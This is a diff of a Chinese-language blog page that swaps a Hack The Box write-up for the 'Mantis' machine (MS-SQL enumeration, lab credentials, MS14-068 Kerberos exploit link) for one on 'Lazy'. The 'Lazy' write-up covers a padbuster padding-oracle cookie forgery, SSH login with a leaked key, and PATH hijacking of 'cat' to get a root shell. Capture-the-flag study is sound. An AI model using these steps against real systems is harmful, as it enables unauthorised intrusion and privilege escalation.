@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="utf-8">
-  <title>htb之Mantis | Hexo</title>
+  <title>htb之Lazy | Hexo</title>
   <meta name="keywords" content=" 博客 , htb ">
-  <meta name="description" content="htb之Mantis | Hexo">
+  <meta name="description" content="htb之Lazy | Hexo">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="htb之Mantisnmap 收集一下信息 可以看到1337和8080端口上运行着web服务目录爆破一下1337端口http://10.10.10.52:1337/secure_notes/上面显示着一个由base64编码组成的文件,打开可以看到一些有用的信息现在解码一下这个文件名不用测试都能看出来这是一个MS-SQL密码,直接连接吧  sqsh -U admin -S 10.10.10.52">
 <meta name="keywords" content="博客,htb">
@@ -289,9 +289,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-htb之Mantis" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-htb之Lazy" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">htb之Mantis</h1>
+        <h1 class="article-title">htb之Lazy</h1>
     
     <div class="article-meta">
         
@@ -315,7 +315,7 @@
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2019-11-11 11:38:06'>2019-11-11 10:30</time>
+        创建时间:<time class="date" title='更新时间: 2019-11-11 17:44:26'>2019-11-11 17:17</time>
         
     </div>
     <div class="article-meta">
@@ -337,7 +337,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#htb之Mantis"><span class="toc-text">htb之Mantis</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#MS14-068"><span class="toc-text">MS14-068</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#htb之Lazy"><span class="toc-text">htb之Lazy</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -353,31 +353,24 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="htb之Mantis"><a href="#htb之Mantis" class="headerlink" title="htb之Mantis"></a>htb之Mantis</h1><p>nmap 收集一下信息</p>
-<p>可以看到1337和8080端口上运行着web服务<br>目录爆破一下1337端口<br><img src="/images/s.png" alt><br><a href="http://10.10.10.52:1337/secure_notes/" target="_blank" rel="noopener">http://10.10.10.52:1337/secure_notes/</a><br>上面显示着一个由base64编码组成的文件,打开可以看到一些有用的信息<br><img src="/images/d.png" alt><br><img src="/images/f.png" alt><br>现在解码一下这个文件名<br><img src="/images/g.png" alt><br>不用测试都能看出来这是一个MS-SQL密码,直接连接吧</p>
+        <h1 id="htb之Lazy"><a href="#htb之Lazy" class="headerlink" title="htb之Lazy"></a>htb之Lazy</h1><p>nmap 收集信息<br><img src="/images/lazy/1.1.png" alt></p>
+<p>只有一个登陆框，创建完用户可以看到突出一个auth cookie,我将拦截请求发送到转发器，以分析其响应。它提示“无效填充”，这意味着可能存在填充oracle漏洞。<br><img src="/images/lazy/1.2.png" alt></p>
+<p>该命令包含目标URL和上面复制的身份验证cooki</p>
 <blockquote>
-<p>sqsh -U admin -S 10.10.10.52</p>
+<p>padbuster <a href="http://10.10.10.18/login.php" target="_blank" rel="noopener">http://10.10.10.18/login.php</a> wiQgvekCJISpjPseG06S%2FLs18d0QcOgo 8 –cookies auth=wiQgvekCJISpjPseG06S%2FLs18d0QcOgo –encoding 0 -plaintext user=admin</p>
 </blockquote>
-<p>使用数据库命令枚举一下所需要的信息</p>
-<ol>
-<li>SELECT name FROM master.dbo.sysdatabases</li>
-<li>go</li>
-<li>SELECT * FROM orcharddb.INFORMATION_SCHEMA.TABLES</li>
-<li>go</li>
-<li>SELECT * FROM orcharddb.INFORMATION_SCHEMA.COLUMNS</li>
-<li>go</li>
-<li>USE orcharddb</li>
-<li>go</li>
-<li>SELECT * FROM blog_Orchard_Users_UserPartRecord</li>
-<li>go</li>
-</ol>
-<p>最后我们能获取到两个用户的账户密码</p>
+<p>跑出admin用户cookie之后，直接替换cookie，转换成admin用户<br><img src="/images/lazy/1.png" alt></p>
+<p>转换成admin用户之后，直接就可以看到ssh秘钥，直接连接吧</p>
 <blockquote>
-<p>admin:Password1234<br>James:J@m3s_P@ssW0rd!</p>
+<p><a href="http://10.10.10.18/mysshkeywithnamemitsos" target="_blank" rel="noopener">http://10.10.10.18/mysshkeywithnamemitsos</a> </p>
 </blockquote>
-<h2 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h2><p>该漏洞针对的是kerberos服务，并允许任何用户通过伪造kerberos票证将其普通用户的权限提升为域管理员。这是一个众所周知的漏洞利用，如果您具有较低的特权用户，则始终值得检查是否与过期的域控制器进行交互。</p>
-<p>exp:<a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek" target="_blank" rel="noopener">https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek</a></p>
-<p>通过漏洞利用，我们能直接获取到system权限</p>
+<p>从文件名可以直接看出该系统用户名是mitsos<br>ssh -i ssh.txt <a href="mailto:mitsos@10.10.10.18" target="_blank" rel="noopener">mitsos@10.10.10.18</a></p>
+<p>成功获取到user.txt，在该目录下peda和备份文件，在执行备份的时候，可以看到它打印带有用户哈希值的影子文件 </p>
+<blockquote>
+<p>strings backup</p>
+</blockquote>
+<p>使用strings 查看该文件的backup中可打印的字符串，发现有命令包含在里面 cat /etc/shadow</p>
+<p>现在只要我创建一个可执行的cat文件，即可获取root权限<br>cd /tmp<br>echo “/bin/sh” &gt; cat<br>chmod 777 cat<br>export PATH=/tmp:$PATH<br>再回去执行一下备份文件./backup<br>OKroot</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 202989353@qq.com </span>
@@ -387,12 +380,12 @@
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>htb之Mantis</p>
+    <p><span class="copy-title">文章标题:</span>htb之Lazy</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="小菜">小菜</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-11-11, 10:30:22</p>
-    <p><span class="copy-title">最后更新:</span>2019-11-11, 11:38:06</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/11/11/htb之Mantis/" title="htb之Mantis">https://manmachines.github.io/2019/11/11/htb之Mantis/</a>
+    <p><span class="copy-title">发布时间:</span>2019-11-11, 17:17:42</p>
+    <p><span class="copy-title">最后更新:</span>2019-11-11, 17:44:26</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/11/11/htb之Lazy/" title="htb之Lazy">https://manmachines.github.io/2019/11/11/htb之Lazy/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
